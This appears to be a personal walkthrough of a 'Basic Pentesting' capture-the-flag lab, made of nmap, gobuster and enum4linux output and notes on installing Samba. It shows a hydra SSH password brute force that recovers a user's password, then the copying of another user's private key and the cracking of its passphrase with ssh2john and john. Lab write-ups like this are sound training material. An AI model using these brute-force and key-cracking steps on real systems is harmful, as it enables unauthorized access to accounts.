# Basinc Pentesting

# Scanning

Nmap scan report for 10.10.72.158  
Host is up (0.49s latency).  
Not shown: 992 closed ports  
PORT      STATE    SERVICE     VERSION  
22/tcp    open     ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)  
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)  
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)  
80/tcp    open     http        Apache httpd 2.4.18 ((Ubuntu))  
|_http-server-header: Apache/2.4.18 (Ubuntu)  
|_http-title: Site doesn't have a title (text/html).  
139/tcp   open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)  
417/tcp   filtered onmux  
445/tcp   open     netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)  
8009/tcp  open     ajp13       Apache Jserv (Protocol v1.3)  
| ajp-methods:  
|_  Supported methods: GET HEAD POST OPTIONS  
8080/tcp  open     http        Apache Tomcat 9.0.7  
|_http-favicon: Apache Tomcat  
|_http-title: Apache Tomcat/9.0.7  
21571/tcp filtered unknown  
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel  

Host script results:  
|_clock-skew: mean: 1h19m59s, deviation: 2h18m35s, median: -1s  
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)  
| smb-os-discovery:  
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)  
|   Computer name: basic2  
|   NetBIOS computer name: BASIC2\x00  
|   Domain name: \x00  
|   FQDN: basic2  
|_  System time: 2020-05-16T06:26:50-04:00  
| smb-security-mode:  
|   account_used: guest  
|   authentication_level: user  
|   challenge_response: supported  
|_  message_signing: disabled (dangerous, but default)  
| smb2-security-mode:  
|   2.02:  
|_    Message signing enabled but not required  
| smb2-time:  
|   date: 2020-05-16T10:26:50  
|_  start_date: N/A  

# using in "gobuster"
gobuster dir -u http://10.10.72.158/ -w /Users/scops/tools/rockyou.txt

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.72.158/
[+] Threads:        10
[+] Wordlist:       directory_guessing_list.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/16 19:42:16 Starting gobuster
===============================================================
/development (Status: 301)


# Samba installation in mac ( my way)
this is for enum4linx install guide
## should be installationg macport

## macport samba installation command about samba :
sudo port install bind9 gnutls readline talloc popt


## after macport dependencies below command : 
sudo port install samba3

## write the : /opt/local/etc/samba3/samba.conf
[Office Admin]
comment = Office Admin
path = /Volumes/Server Data RAID/Office Admin
available = yes
guest ok = yes
create mask = 644
directory mask = 755
read only = no

# Samba Enumeration Result : 
WARNING: polenum.py is not in your path.  Check that package is installed and your PATH is sane.  
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat May 16 22:08:45 2020  

 ==========================  
|    Target Information    |  
 ==========================  
Target ........... 10.10.28.75  
RID Range ........ 500-550,1000-1050  
Username ......... ''  
Password ......... ''  
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none  
...  
S-1-22-1-1000 Unix User\kay (Local User)  
S-1-22-1-1001 Unix User\jan (Local User)  

 ============================================  
|    Getting printer info for 10.10.28.75    |  
 ============================================  
No printers returned.  


# Password Guessing : 
## Command : hydra -l jan -P password_guessing_list.txt ssh://10.10.28.75/  

Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.  

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-16 23:17:58  
[WARNING] Many SSH configurations limit the number of parallel tasks, it is   recommended to reduce the tasks: use -t 4  
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task  
[DATA] attacking ssh://10.10.28.75:22/  


[STATUS] 142.00 tries/min, 142 tries in 00:01h, 14344256 to do in 1683:36h, 16 active  
[STATUS] 112.00 tries/min, 336 tries in 00:03h, 14344062 to do in 2134:32h, 16 active  
[STATUS] 105.14 tries/min, 736 tries in 00:07h, 14343662 to do in 2273:41h, 16 active  
[22][ssh] host: 10.10.28.75   login: jan   password: armando  
1 of 1 target successfully completed, 1 valid password found  
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-16 23:25:25  

# Priviliage Escalate  
[+] Linpeas
  1. id_rsa copyit  
  2. ssh2john.py crack it    
  EX.  
    ./ssh2john.py /Users/scops/tools/hacking_project/thm/Basic_Pentesting/kay_id_rsa > forjohn.txt

# cracked it hash
john forjohn.txt
Note: This format may emit false positives, so it will keep trying even after finding a
possible candidate.
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 1 candidate buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/Users/scops/tools/JohnTheRipper/run/password.lst
Proceeding with incremental:ASCII
0g 0:00:00:28  3/3 0g/s 1505Kp/s 1505Kc/s 1505KC/s buttia130
0g 0:00:00:28  3/3 0g/s 1515Kp/s 1515Kc/s 1515KC/s mhicker
Session aborted


# Using the john !
john forjohn.txt --wordlist=/Users/scops/tools/password_guessing_list.txt
Note: This format may emit false positives, so it will keep trying even after finding a
possible candidate.
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (/Users/scops/tools/hacking_project/thm/Basic_Pentesting/kay_id_rsa)
1g 0:00:00:09 DONE (2020-05-17 00:30) 0.1008g/s 1445Kp/s 1445Kc/s 1445KC/s *7Â¡Vamos!
Session completed.
